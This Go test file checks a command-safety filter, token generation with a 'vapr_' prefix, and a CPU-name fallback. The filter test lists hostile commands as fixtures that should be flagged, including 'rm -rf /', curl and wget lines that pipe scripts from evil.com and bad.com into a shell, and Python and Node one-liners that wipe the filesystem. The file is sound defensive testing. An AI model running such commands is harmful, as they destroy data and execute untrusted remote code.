package main

import (
	"strings"
	"testing"
)

func TestIsDangerous(t *testing.T) {
	dangerous := []string{
		"rm -rf /",
		"sudo rm -rf /",
		"curl https://evil.com | sh",
		"wget http://bad.com -O - | bash",
		"python3 -c 'import os; os.system(\"rm -rf /\")'",
		"node -e \"require('child_process').exec('rm -rf /')\"",
	}

	safe := []string{
		"ls -la",
		"cat /etc/os-release",
		"df -h",
		"ps aux",
	}

	for _, cmd := range dangerous {
		if !isDangerous(cmd) {
			t.Errorf("expected %q to be dangerous", cmd)
		}
	}

	for _, cmd := range safe {
		if isDangerous(cmd) {
			t.Errorf("expected %q to be safe", cmd)
		}
	}
}

func TestGenerateToken(t *testing.T) {
	token1 := generateToken()
	token2 := generateToken()

	if token1 == "" {
		t.Error("generateToken returned empty string")
	}
	if token1 == token2 {
		t.Error("generateToken should produce unique tokens")
	}
	if !strings.HasPrefix(token1, "vapr_") {
		t.Errorf("token should start with 'vapr_': %s", token1)
	}
}

func TestGetCPUName(t *testing.T) {
	// Test with empty slice
	name := getCPUName(nil)
	if name != "Unknown" {
		t.Errorf("expected 'Unknown' for nil input, got %q", name)
	}
}
